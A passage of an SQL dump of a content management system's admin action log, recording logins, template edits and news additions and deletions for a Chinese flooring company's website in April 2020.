15:53:57','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'52190'),(393,'127.0.0.1','2020-04-16 15:54:26','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'52212'),(394,'127.0.0.1','2020-04-16 15:54:41','admin','EditClass','classid=5<br>classname=公司实力',0,'52227'),(395,'127.0.0.1','2020-04-16 15:55:01','admin','EditClass','classid=5<br>classname=公司实力',0,'52244'),(396,'127.0.0.1','2020-04-16 15:55:31','admin','EditClass','classid=20<br>classname=荣誉资质',0,'52262'),(397,'127.0.0.1','2020-04-16 15:55:43','admin','ReListHtml_all','---',0,'52272'),(398,'127.0.0.1','2020-04-16 15:55:44','admin','ReIndex','---',0,'52272'),(399,'127.0.0.1','2020-04-16 15:57:04','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'52343'),(400,'127.0.0.1','2020-04-16 15:58:10','admin','DelNews','classid=20<br>id=72<br>title=荣誉9',1000010000000072,'52384'),(401,'127.0.0.1','2020-04-16 15:58:14','admin','DelNews','classid=20<br>id=71<br>title=荣誉8',1000010000000071,'52384'),(402,'127.0.0.1','2020-04-16 15:58:18','admin','DelNews','classid=20<br>id=70<br>title=荣誉7',1000010000000070,'52384'),(403,'127.0.0.1','2020-04-16 15:58:21','admin','DelNews','classid=20<br>id=69<br>title=荣誉6',1000010000000069,'52384'),(404,'127.0.0.1','2020-04-16 15:58:26','admin','DelNews','classid=20<br>id=68<br>title=荣誉5',1000010000000068,'52384'),(405,'127.0.0.1','2020-04-16 15:58:30','admin','DelNews','classid=20<br>id=67<br>title=荣誉4',1000010000000067,'52384'),(406,'127.0.0.1','2020-04-16 15:58:33','admin','DelNews','classid=20<br>id=66<br>title=荣誉3',1000010000000066,'52384'),(407,'127.0.0.1','2020-04-16 15:58:43','admin','DelNews','classid=20<br>id=65<br>title=荣誉2',1000010000000065,'52418'),(408,'127.0.0.1','2020-04-16 15:58:47','admin','DelNews','classid=20<br>id=64<br>title=荣誉1',1000010000000064,'52418'),(409,'127.0.0.1','2020-04-16 15:59:22','admin','AddNews','classid=20<br>id=83<br>title=荣誉1',1000010000000083,'52445'),(410,'127.0.0.1','2020-04-16 15:59:38','admin','AddNews','classid=20<br>id=84<br>title=荣誉2',1000010000000084,'52461'),(411,'127.0.0.1','2020-04-16 15:59:52','admin','AddNews','classid=20<br>id=85<br>title=荣誉3',1000010000000085,'52475'),(412,'127.0.0.1','2020-04-16 16:00:09','admin','AddNews','classid=20<br>id=86<br>title=荣誉4',1000010000000086,'52492'),(413,'127.0.0.1','2020-04-16 16:00:24','admin','AddNews','classid=20<br>id=87<br>title=荣誉5',1000010000000087,'52508'),(414,'127.0.0.1','2020-04-16 16:01:27','admin','AddNews','classid=20<br>id=88<br>title=荣誉6',1000010000000088,'52537'),(415,'127.0.0.1','2020-04-16 16:01:47','admin','AddNews','classid=20<br>id=89<br>title=荣誉7',1000010000000089,'52578'),(416,'127.0.0.1','2020-04-16 16:02:43','admin','AddNews','classid=20<br>id=90<br>title=荣誉8',1000010000000090,'52614'),(417,'127.0.0.1','2020-04-16 16:03:08','admin','AddNews','classid=20<br>id=91<br>title=荣誉9',1000010000000091,'52628'),(418,'127.0.0.1','2020-04-16 16:03:51','admin','EditClass','classid=20<br>classname=荣誉资质',0,'52672'),(419,'127.0.0.1','2020-04-16 16:03:57','admin','ReListHtml_all','---',0,'52672'),(420,'127.0.0.1','2020-04-16 16:04:01','admin','ReIndex','---',0,'52686'),(421,'127.0.0.1','2020-04-16 16:04:10','admin','ReListHtml','---',0,'52696'),(422,'127.0.0.1','2020-04-16 16:04:14','admin','ReListHtml','---',0,'52696'),(423,'127.0.0.1','2020-04-16 16:04:45','admin','EditClass','classid=20<br>classname=荣誉资质',0,'52720'),(424,'127.0.0.1','2020-04-16 16:04:56','admin','EditClass','classid=20<br>classname=荣誉资质',0,'52730'),(425,'127.0.0.1','2020-04-16 16:05:00','admin','ReListHtml_all','---',0,'52730'),(426,'127.0.0.1','2020-04-16 16:05:04','admin','ReIndex','---',0,'52742'),(427,'127.0.0.1','2020-04-16 16:05:52','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'52773'),(428,'127.0.0.1','2020-04-16 16:06:08','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'52796'),(429,'127.0.0.1','2020-04-16 16:06:21','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'52803'),(430,'127.0.0.1','2020-04-16 16:06:25','admin','ReListHtml_all','---',0,'52803'),(431,'127.0.0.1','2020-04-16 16:06:56','admin','EditClass','classid=20<br>classname=荣誉资质',0,'52836'),(432,'127.0.0.1','2020-04-16 16:07:00','admin','ReListHtml_all','---',0,'52836'),(433,'127.0.0.1','2020-04-16 16:07:40','admin','EditClass','classid=21<br>classname=合作伙伴',0,'52879'),(434,'127.0.0.1','2020-04-16 16:07:45','admin','ReListHtml_all','---',0,'52879'),(435,'127.0.0.1','2020-04-16 16:09:09','admin','EditClass','classid=21<br>classname=合作伙伴',0,'52940'),(436,'127.0.0.1','2020-04-16 16:09:14','admin','ReListHtml_all','---',0,'52940'),(437,'127.0.0.1','2020-04-16 16:10:06','admin','EditClass','classid=6<br>classname=联系我们',0,'52991'),(438,'127.0.0.1','2020-04-16 16:10:19','admin','EditNews','classid=6<br>id=4<br>title=联系我们',1000010000000004,'53003'),(439,'127.0.0.1','2020-04-16 16:11:37','admin','EditPublicTemp','gid=1',0,'53056'),(440,'127.0.0.1','2020-04-16 16:11:49','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'53065'),(441,'127.0.0.1','2020-04-16 16:12:01','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'53073'),(442,'127.0.0.1','2020-04-16 16:12:12','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'53082'),(443,'127.0.0.1','2020-04-16 16:12:22','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53089'),(444,'127.0.0.1','2020-04-16 16:12:31','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'53089'),(445,'127.0.0.1','2020-04-16 16:12:40','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'53103'),(446,'127.0.0.1','2020-04-16 16:12:50','admin','EditNewstemp','tempid=1<br>tempname=新闻内容模板&amp;gid=1',0,'53113'),(447,'127.0.0.1','2020-04-16 16:12:56','admin','ReListHtml_all','---',0,'53113'),(448,'127.0.0.1','2020-04-16 16:13:06','admin','ReIndex','---',0,'53113'),(449,'127.0.0.1','2020-04-17 09:50:58','admin','login','---',0,'54346'),(450,'127.0.0.1','2020-04-17 10:03:59','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'55292'),(451,'127.0.0.1','2020-04-17 10:04:05','admin','ReListHtml_all','---',0,'55292'),(452,'127.0.0.1','2020-04-17 10:04:46','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'55329'),(453,'127.0.0.1','2020-04-17 10:05:15','admin','ReListHtml_all','---',0,'55351'),(454,'127.0.0.1','2020-04-17 11:25:48','admin','login','---',0,'65202'),(455,'127.0.0.1','2020-04-17 11:26:22','admin','DelListtemp','tempid=5<br>tempname=默认电影列表模板&amp;gid=1',0,'65252'),(456,'127.0.0.1','2020-04-17 11:26:26','admin','DelListtemp','tempid=6<br>tempname=默认商城列表模板&amp;gid=1',0,'65252'),(457,'127.0.0.1','2020-04-17 11:26:30','admin','DelListtemp','tempid=7<br>tempname=默认文章列表模板&amp;gid=1',0,'65252'),(458,'127.0.0.1','2020-04-17 11:26:35','admin','DelListtemp','tempid=8<br>tempname=分类信息默认列表模板&amp;gid=1',0,'65252'),(459,'127.0.0.1','2020-04-17 11:26:41','admin','DelNewstemp','tempid=4<br>tempname=默认图片内容模板(图片集)&amp;gid=1',0,'65252'),(460,'127.0.0.1','2020-04-17 11:26:46','admin','DelNewstemp','tempid=5<br>tempname=默认FLASH内容模板&amp;gid=1',0,'65252'),(461,'127.0.0.1','2020-04-17 11:26:50','admin','DelNewstemp','tempid=6<br>tempname=默认电影内容模板&amp;gid=1',0,'65252'),(462,'127.0.0.1','2020-04-17 11:26:54','admin','DelNewstemp','tempid=7<br>tempname=默认商城内容模板&amp;gid=1',0,'65252'),(463,'127.0.0.1','2020-04-17 11:26:58','admin','DelNewstemp','tempid=8<br>tempname=默认文章内容模板&amp;gid=1',0,'65252'),(464,'127.0.0.1','2020-04-17 11:27:02','admin','DelNewstemp','tempid=9<br>tempname=默认分类信息内容模板&amp;gid=1',0,'65252'),(465,'127.0.0.1','2020-04-17 11:33:32','admin','EditNews','classid=6<br>id=4<br>title=联系我们',1000010000000004,'49308'),(466,'127.0.0.1','2020-04-17 11:39:28','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'49645'),(467,'127.0.0.1','2020-04-17 11:39:47','admin','ReListHtml_all','---',0,'49657'),(468,'127.0.0.1','2020-04-17 11:39:48','admin','ReIndex','---',0,'49657'),(469,'127.0.0.1','2020-04-17 11:40:39','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'49707'),(470,'127.0.0.1','2020-04-17 11:40:42','admin','ReListHtml_all','---',0,'49707'),(471,'127.0.0.1','2020-04-17 11:40:46','admin','ReIndex','---',0,'49707'),(472,'127.0.0.1','2020-04-17 11:48:19','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50167'),(473,'127.0.0.1','2020-04-17 11:48:22','admin','ReListHtml_all','---',0,'50167'),(474,'127.0.0.1','2020-04-17 11:48:52','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50221'),(475,'127.0.0.1','2020-04-17 11:48:58','admin','ReListHtml_all','---',0,'50221'),(476,'127.0.0.1','2020-04-17 11:56:39','admin','EditBqtemp','tempid=1<br>tempname=子栏目导航标签模板&amp;gid=1',0,'50919'),(477,'127.0.0.1','2020-04-17 11:56:44','admin','ReListHtml_all','---',0,'50919'),(478,'127.0.0.1','2020-04-17 11:57:02','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50944'),(479,'127.0.0.1','2020-04-17 11:57:05','admin','ReListHtml_all','---',0,'50944'),(480,'127.0.0.1','2020-04-17 11:58:36','admin','EditBqtemp','tempid=1<br>tempname=子栏目导航标签模板&amp;gid=1',0,'51032'),(481,'127.0.0.1','2020-04-17 11:58:42','admin','ReListHtml_all','---',0,'51032'),(482,'127.0.0.1','2020-04-17 12:21:20','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'60248'),(483,'127.0.0.1','2020-04-17 12:21:38','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'60259'),(484,'127.0.0.1','2020-04-17 12:21:49','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'60274'),(485,'127.0.0.1','2020-04-17 12:22:11','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'60282'),(486,'127.0.0.1','2020-04-17 12:23:18','admin','ReListHtml_all','---',0,'60311'),(487,'127.0.0.1','2020-04-17 12:23:19','admin','ReIndex','---',0,'60311'),(488,'127.0.0.1','2020-04-17 13:13:12','admin','login','---',0,'59232'),(489,'127.0.0.1','2020-04-17 13:15:17','admin','EditPublicTemp','gid=1',0,'59407'),(490,'127.0.0.1','2020-04-17 13:15:25','admin','EditPublicTemp','gid=1',0,'59414'),(491,'127.0.0.1','2020-04-17 13:16:05','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'59433'),(492,'127.0.0.1','2020-04-17 13:16:28','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'59447'),(493,'127.0.0.1','2020-04-17 13:16:39','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'59457'),(494,'127.0.0.1','2020-04-17 13:16:51','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'59464'),(495,'127.0.0.1','2020-04-17 13:17:15','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'59489'),(496,'127.0.0.1','2020-04-17 13:17:27','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'59500'),(497,'127.0.0.1','2020-04-17 13:17:38','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'59508'),(498,'127.0.0.1','2020-04-17 13:17:46','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'59508'),(499,'127.0.0.1','2020-04-17 13:17:52','admin','EditNewstemp','tempid=1<br>tempname=新闻内容模板&amp;gid=1',0,'59508'),(500,'127.0.0.1','2020-04-17 13:19:18','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'59562'),(501,'127.0.0.1','2020-04-17 13:20:21','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'59606'),(502,'127.0.0.1','2020-04-17 13:21:51','admin','EditPublicTemp','gid=1',0,'59651'),(503,'127.0.0.1','2020-04-17 13:23:10','admin','ReListHtml_all','---',0,'59712'),(504,'127.0.0.1','2020-04-17 13:23:11','admin','ReIndex','---',0,'59712'),(505,'127.0.0.1','2020-04-17 13:24:24','admin','EditTempvar','varid=1<br>var=header&amp;gid=1',0,'59791'),(506,'127.0.0.1','2020-04-17 13:24:27','admin','ReIndex','---',0,'59791'),(507,'127.0.0.1','2020-04-17 13:26:02','admin','EditTempvar','varid=1<br>var=header&amp;gid=1',0,'59853'),(508,'127.0.0.1','2020-04-17 13:26:12','admin','ReListHtml_all','---',0,'59853'),(509,'127.0.0.1','2020-04-17 13:29:25','admin','login','---',0,'60154'),(510,'127.0.0.1','2020-04-17 13:30:01','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'60204'),(511,'127.0.0.1','2020-04-17 13:30:06','admin','ReIndex','---',0,'60204'),(512,'222.210.87.241','2020-04-20 15:56:24','admin','login','---',0,'54890'),(513,'222.210.87.241','2020-04-20 16:02:43','admin','login','---',0,'25889'),(514,'222.210.87.241','2020-04-20 16:03:11','admin','EditListtemp','tempid=4<br>tempname=公司实力列表模板&amp;gid=1',0,'55267'),(515,'222.210.87.241','2020-04-20 16:03:24','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'55278'),(516,'222.210.87.241','2020-04-20 16:03:36','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55284'),(517,'222.210.87.241','2020-04-20 16:03:48','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'55294'),(518,'222.210.87.241','2020-04-20 16:03:57','admin','ReListHtml_all','---',0,'55304'),(519,'222.210.87.241','2020-04-23 10:10:29','admin','login','---',0,'48895'),(520,'222.210.87.241','2020-04-23 10:30:49','admin','login','---',0,'50159'),(521,'222.210.87.241','2020-04-23 10:32:11','admin','EditTempvar','varid=1<br>var=header&amp;gid=1',0,'50209'),(522,'222.210.87.241','2020-04-23 10:49:12','admin','ReListHtml_all','---',0,'59100'),(523,'222.210.87.241','2020-04-23 10:49:15','admin','ReIndex','---',0,'59100'),(524,'222.210.87.241','2020-04-23 11:13:20','admin','login','---',0,'59593'),(525,'222.210.87.241','2020-04-23 11:13:59','admin','DelNews','classid=14<br>id=82<br>title=公司风采',1000010000000082,'59612'),(526,'222.210.87.241','2020-04-23 11:15:38','admin','AddNews','classid=14<br>id=92<br>title=公司一角',1000010000000092,'52269'),(527,'222.210.87.241','2020-04-23 11:16:11','admin','EditNews','classid=14<br>id=92<br>title=公司一角',1000010000000092,'52288'),(528,'222.210.87.241','2020-04-23 12:28:23','admin','login','---',0,'57967'),(529,'222.210.87.241','2020-04-23 12:29:08','admin','AddNews','classid=18<br>id=93<br>title=成都易上集团OCG地下车库聚氨脂地坪',1000010000000093,'63342'),(530,'222.210.87.241','2020-04-23 12:29:30','admin','AddNews','classid=18<br>id=94<br>title=南部县大润发地下车库砂浆地坪',1000010000000094,'58035'),(531,'222.210.87.241','2020-04-23 12:29:56','admin','AddNews','classid=18<br>id=95<br>title=南充市航务局地下车库聚氨脂地坪',1000010000000095,'58119'),(532,'222.210.87.241','2020-04-23 12:30:17','admin','AddNews','classid=18<br>id=96<br>title=南充市中心医院地下车库环氧砂浆地',1000010000000096,'58139'),(533,'222.210.87.241','2020-04-23 12:34:04','admin','AddNews','classid=18<br>id=97<br>title=遂宁金海国际地下车库环氧地坪',1000010000000097,'63504'),(534,'222.210.87.241','2020-04-23 12:34:35','admin','EditNews','classid=18<br>id=97<br>title=遂宁金海国际地下车库环氧地坪',1000010000000097,'58471'),(535,'222.210.87.241','2020-04-23 12:35:05','admin','AddNews','classid=18<br>id=98<br>title=条纹防滑坡道',1000010000000098,'63536'),(536,'222.210.87.241','2020-04-23 12:49:34','admin','ReListHtml_all','---',0,'63964'),(537,'222.210.87.241','2020-04-23 12:49:37','admin','ReIndex','---',0,'63964'),(538,'222.210.87.241','2020-04-23 12:51:42','admin','EditNews','classid=18<br>id=97<br>title=遂宁金海国际地下车库环氧地坪',1000010000000097,'64050'),(539,'222.210.87.241','2020-04-23 12:52:09','admin','EditNews','classid=18<br>id=96<br>title=南充市中心医院地下车库环氧砂浆地',1000010000000096,'64066'),(540,'222.210.87.241','2020-04-23 12:52:16','admin','ReListHtml_all','---',0,'64066'),(541,'222.210.87.241','2020-04-23 12:52:53','admin','DelNews','classid=18<br>id=97<br>title=遂宁金海国际地下车库环氧地坪',1000010000000097,'64100'),(542,'222.210.87.241','2020-04-23 12:53:00','admin','DelNews','classid=18<br>id=96<br>title=南充市中心医院地下车库环氧砂浆地',1000010000000096,'64100'),(543,'222.210.87.241','2020-04-23 12:53:06','admin','ReListHtml_all','---',0,'64106'),(544,'222.210.87.241','2020-04-23 13:14:19','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64552'),(545,'222.210.87.241','2020-04-23 13:15:07','admin','ReListHtml_all','---',0,'60451'),(546,'222.210.87.241','2020-04-23 13:15:16','admin','ReListHtml_all','---',0,'64586'),(547,'222.210.87.241','2020-04-23 13:18:01','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64676'),(548,'222.210.87.241','2020-04-23 13:18:22','admin','ReListHtml_all','---',0,'64687'),(549,'222.210.87.241','2020-04-23 13:20:11','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64747'),(550,'222.210.87.241','2020-04-23 13:20:16','admin','ReListHtml_all','---',0,'64752'),(551,'222.210.87.241','2020-04-23 13:20:57','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64778'),(552,'222.210.87.241','2020-04-23 13:21:01','admin','ReListHtml_all','---',0,'64778'),(553,'222.210.87.241','2020-04-23 13:21:31','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'60871'),(554,'222.210.87.241','2020-04-23 13:22:16','admin','ReEBakTemp','bid=154&amp;temptype=listtemp<br>tempid=3&amp;tempname=案例列表模板&amp;gid=1',0,'17415'),(555,'222.210.87.241','2020-04-23 13:22:29','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'61161'),(556,'222.210.87.241','2020-04-23 13:22:38','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'61161'),(557,'222.210.87.241','2020-04-23 13:22:45','admin','ReListHtml_all','---',0,'61161'),(558,'222.210.87.241','2020-04-23 13:23:26','admin','ReEBakTemp','bid=156&amp;temptype=listtemp<br>tempid=3&amp;tempname=案例列表模板&amp;gid=1',0,'64859'),(559,'222.210.87.241','2020-04-23 13:23:28','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64859'),(560,'222.210.87.241','2020-04-23 13:23:33','admin','ReListHtml_all','---',0,'64859'),(561,'222.210.87.241','2020-04-23 13:24:39','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64904'),(562,'222.210.87.241','2020-04-23 13:24:44','admin','ReListHtml_all','---',0,'64904'),(563,'222.210.87.241','2020-04-23 13:46:48','admin','ReListHtml_all','---',0,'65406'),(564,'222.210.87.241','2020-04-23 13:49:36','admin','ReListHtml_all','---',0,'65516'),(565,'222.210.87.241','2020-04-23 13:50:56','admin','AddNews','classid=18<br>id=99<br>title=南充市中心医院地下车库环氧砂浆地',1000010000000099,'49162'),(566,'222.210.87.241','2020-04-23 13:51:22','admin','AddNews','classid=18<br>id=100<br>title=遂宁金海国际地下车库环氧地坪',1000010000000100,'49174'),(567,'222.210.87.241','2020-04-23 13:51:28','admin','ReListHtml_all','---',0,'49174'),(568,'222.210.87.241','2020-04-23 13:51:30','admin','ReIndex','---',0,'49174'),(569,'222.210.87.241','2020-04-23 13:56:10','admin','AddNews','classid=11<br>id=101<br>title=丽邦环氧树脂材料',1000010000000101,'49316'),(570,'222.210.87.241','2020-04-23 14:05:59','admin','AddNews','classid=20<br>id=102<br>title=荣誉10',1000010000000102,'49760'),(571,'222.210.87.241','2020-04-23 14:06:16','admin','AddNews','classid=20<br>id=103<br>title=荣誉11',1000010000000103,'49772'),(572,'222.210.87.241','2020-04-23 14:06:40','admin','AddNews','classid=20<br>id=104<br>title=荣誉12',1000010000000104,'49786'),(573,'222.210.87.241','2020-04-23 14:06:51','admin','EditNews','classid=20<br>id=102<br>title=荣誉10',1000010000000102,'49786'),(574,'222.210.87.241','2020-04-23 14:06:59','admin','EditNews','classid=20<br>id=104<br>title=荣誉12',1000010000000104,'49786'),(575,'222.210.87.241','2020-04-23 14:07:18','admin','AddNews','classid=20<br>id=105<br>title=荣誉13',1000010000000105,'63267'),(576,'222.210.87.241','2020-04-23 14:07:37','admin','AddNews','classid=20<br>id=106<br>title=荣誉14',1000010000000106,'63281'),(577,'222.210.87.241','2020-04-23 14:08:27','admin','AddNews','classid=20<br>id=107<br>title=荣誉15',1000010000000107,'63331'),(578,'222.210.87.241','2020-04-23 14:08:46','admin','AddNews','classid=20<br>id=108<br>title=荣誉16',1000010000000108,'63357'),(579,'222.210.87.241','2020-04-23 14:08:52','admin','ReListHtml_all','---',0,'63357'),(580,'222.210.87.241','2020-04-23 14:11:33','admin','EditNews','classid=20<br>id=107<br>title=荣誉15',1000010000000107,'63619'),(581,'222.210.87.241','2020-04-23 14:11:38','admin','ReListHtml_all','---',0,'63619'),(582,'222.210.87.241','2020-04-23 14:50:16','admin','AddClass','classid=22<br>classname=混凝土激光摊铺整平',0,'51207'),(583,'222.210.87.241','2020-04-23 14:50:39','admin','ReListHtml_all','---',0,'51210'),(584,'222.210.87.241','2020-04-23 14:56:10','admin','AddClass','classid=23<br>classname=交通安全设施',0,'2047'),(585,'222.210.87.241','2020-04-23 14:56:17','admin','ReListHtml_all','---',0,'2047'),(586,'222.210.87.241','2020-04-23 15:14:37','admin','AddClass','classid=24<br>classname=固化剂地坪',0,'2357'),(587,'222.210.87.241','2020-04-23 15:15:00','admin','ChangeClassIslast','classid=22<br>classname=混凝土激光摊铺整平',0,'51682'),(588,'222.210.87.241','2020-04-23 15:15:09','admin','ChangeClassIslast','classid=23<br>classname=交通安全设施',0,'2405'),(589,'222.210.87.241','2020-04-23 15:15:16','admin','ChangeClassIslast','classid=24<br>classname=固化剂地坪',0,'2405'),(590,'222.210.87.241','2020-04-23 15:15:22','admin','ReListHtml_all','---',0,'2405'),(591,'222.210.87.241','2020-04-23 15:19:40','admin','EditClass','classid=24<br>classname=固化剂地坪',0,'51836'),(592,'222.210.87.241','2020-04-23 15:19:51','admin','EditClass','classid=23<br>classname=交通安全设施',0,'51842'),(593,'222.210.87.241','2020-04-23 15:19:59','admin','EditClass','classid=22<br>classname=混凝土激光摊铺整平',0,'51842'),(594,'222.210.87.241','2020-04-23 15:20:09','admin','ReListHtml_all','---',0,'51846'),(595,'222.210.87.241','2020-04-23 15:22:24','admin','AddNews','classid=23<br>id=109<br>title=交通安全设施1',1000010000000109,'51946'),(596,'222.210.87.241','2020-04-23 15:22:44','admin','AddNews','classid=23<br>id=110<br>title=交通安全设施2',1000010000000110,'51958'),(597,'222.210.87.241','2020-04-23 15:23:09','admin','AddNews','classid=23<br>id=111<br>title=交通安全设施3',1000010000000111,'51972'),(598,'222.210.87.241','2020-04-23 15:23:27','admin','AddNews','classid=23<br>id=112<br>title=交通安全设施4',1000010000000112,'51984'),(599,'222.210.87.241','2020-04-23 15:23:45','admin','AddNews','classid=23<br>id=113<br>title=交通安全设施5',1000010000000113,'51994'),(600,'222.210.87.241','2020-04-23 15:24:02','admin','AddNews','classid=23<br>id=114<br>title=交通安全设施6',1000010000000114,'52006'),(601,'222.210.87.241','2020-04-23 15:24:18','admin','AddNews','classid=23<br>id=115<br>title=交通安全设施7',1000010000000115,'52006'),(602,'222.210.87.241','2020-04-23 15:33:11','admin','DelNews','classid=23<br>id=115<br>title=交通安全设施7',1000010000000115,'62577'),(603,'222.210.87.241','2020-04-23 15:33:15','admin','DelNews','classid=23<br>id=114<br>title=交通安全设施6',1000010000000114,'62577'),(604,'222.210.87.241','2020-04-23 15:33:18','admin','DelNews','classid=23<br>id=113<br>title=交通安全设施5',1000010000000113,'62577'),(605,'222.210.87.241','2020-04-23 15:33:23','admin','DelNews','classid=23<br>id=112<br>title=交通安全设施4',1000010000000112,'62577'),(606,'222.210.87.241','2020-04-23 15:33:26','admin','DelNews','classid=23<br>id=111<br>title=交通安全设施3',1000010000000111,'62577'),(607,'222.210.87.241','2020-04-23 15:33:29','admin','DelNews','classid=23<br>id=110<br>title=交通安全设施2',1000010000000110,'62577'),(608,'222.210.87.241','2020-04-23 15:33:32','admin','DelNews','classid=23<br>id=109<br>title=交通安全设施1',1000010000000109,'62577'),(609,'222.210.87.241','2020-04-23 15:35:54','admin','login','---',0,'3937'),(610,'222.210.87.241','2020-04-23 15:40:34','admin','login','---',0,'62822'),(611,'222.210.87.241','2020-04-23 15:43:03','admin','AddNews','classid=18<br>id=116<br>title=遂宁电影院城市广场陶瓷防滑地坪',1000010000000116,'62986'),(612,'222.210.87.241','2020-04-23 15:43:11','admin','ReListHtml_all','---',0,'62986'),(613,'222.210.87.241','2020-04-23 16:00:55','admin','EditTempvar','varid=1<br>var=header&amp;gid=1',0,'64145'),(614,'222.210.87.241','2020-04-23 16:01:01','admin','ReListHtml_all','---',0,'64145'),(615,'222.210.87.241','2020-04-23 16:01:02','admin','ReIndex','---',0,'64145'),(616,'222.210.87.241','2020-04-23 17:08:26','admin','login','---',0,'58858'),(617,'222.210.87.241','2020-04-23 17:08:49','admin','AddClass','classid=25<br>classname=透水混凝土',0,'10999'),(618,'222.210.87.241','2020-04-23 17:11:05','admin','ReListHtml_all','---',0,'11239'),(619,'222.210.87.241','2020-04-24 10:27:29','admin','login','---',0,'20703'),(620,'222.210.87.241','2020-04-24 10:30:26','admin','AddNews','classid=8<br>id=117<br>title=车库环氧地坪1',1000010000000117,'56830'),(621,'222.210.87.241','2020-04-24 10:30:43','admin','AddNews','classid=8<br>id=118<br>title=车库环氧地坪2',1000010000000118,'20881'),(622,'222.210.87.241','2020-04-24 10:31:08','admin','AddNews','classid=8<br>id=119<br>title=车库环氧地坪3',1000010000000119,'20905'),(623,'222.210.87.241','2020-04-24 10:31:23','admin','AddNews','classid=8<br>id=120<br>title=车库环氧地坪4',1000010000000120,'27035'),(624,'222.210.87.241','2020-04-24 10:31:38','admin','AddNews','classid=8<br>id=121<br>title=车库环氧地坪5',1000010000000121,'56882'),(625,'222.210.87.241','2020-04-24 10:31:52','admin','AddNews','classid=8<br>id=122<br>title=车库环氧地坪6',1000010000000122,'20929'),(626,'222.210.87.241','2020-04-24 10:32:06','admin','AddNews','classid=8<br>id=123<br>title=车库环氧地坪7',1000010000000123,'56900'),(627,'222.210.87.241','2020-04-24 10:32:23','admin','AddNews','classid=8<br>id=124<br>title=车库环氧地坪8',1000010000000124,'56916'),(628,'222.210.87.241','2020-04-24 10:32:42','admin','AddNews','classid=8<br>id=125<br>title=车库环氧地坪9',1000010000000125,'56930'),(629,'222.210.87.241','2020-04-24 10:32:57','admin','AddNews','classid=8<br>id=126<br>title=车库环氧地坪10',1000010000000126,'20973'),(630,'222.210.87.241','2020-04-24 10:33:14','admin','AddNews','classid=8<br>id=127<br>title=车库环氧地坪11',1000010000000127,'20985'),(631,'222.210.87.241','2020-04-24 10:34:04','admin','AddNews','classid=24<br>id=128<br>title=固化剂地坪1',1000010000000128,'21019'),(632,'222.210.87.241','2020-04-24 10:34:29','admin','EditNews','classid=24<br>id=128<br>title=混凝土固化地坪',1000010000000128,'57004'),(633,'222.210.87.241','2020-04-24 10:34:54','admin','AddNews','classid=24<br>id=129<br>title=固化剂地坪1',1000010000000129,'57018'),(634,'222.210.87.241','2020-04-24 10:35:08','admin','AddNews','classid=24<br>id=130<br>title=固化剂地坪2',1000010000000130,'21077'),(635,'222.210.87.241','2020-04-24 10:35:22','admin','AddNews','classid=24<br>id=131<br>title=固化剂地坪4',1000010000000131,'21083'),(636,'222.210.87.241','2020-04-24 10:35:32','admin','ReListHtml_all','---',0,'21083'),(637,'222.210.87.241','2020-04-24 10:36:38','admin','AddNews','classid=23<br>id=132<br>title=交通安全设施1',1000010000000132,'57090'),(638,'222.210.87.241','2020-04-24 10:36:53','admin','AddNews','classid=23<br>id=133<br>title=交通安全设施2',1000010000000133,'21173'),(639,'222.210.87.241','2020-04-24 